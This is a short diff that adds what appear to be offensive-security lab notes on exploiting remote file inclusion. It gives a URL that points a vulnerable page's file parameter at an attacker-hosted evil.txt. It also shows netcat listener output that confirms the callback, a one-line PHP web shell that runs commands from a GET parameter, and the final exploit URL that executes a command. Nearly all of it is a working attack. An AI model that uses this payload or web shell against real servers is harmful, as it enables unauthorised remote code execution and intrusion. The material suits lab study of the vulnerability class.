@@ -1,0 +1,22 @@
+#!/usr/bin/peno
+
+#Using the file parameter for an RFI payload
+http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
+
+#Using a Netcat listener to verify RFI
+kali@kali:~$ sudo nc -nvlp 80
+listening on [any] 80 ...
+connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50324
+GET /evil.txt HTTP/1.0
+Host: 10.11.0.4
+Connection: close
+
+
+#Shell
+kali@kali:/var/www/html$ cat evil.txt
+<?php echo shell_exec($_GET['cmd']); ?>
+
+kali@kali:/var/www/html$ sudo systemctl restart apache2
+
+#Exploiting the RFI vulnerability
+http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
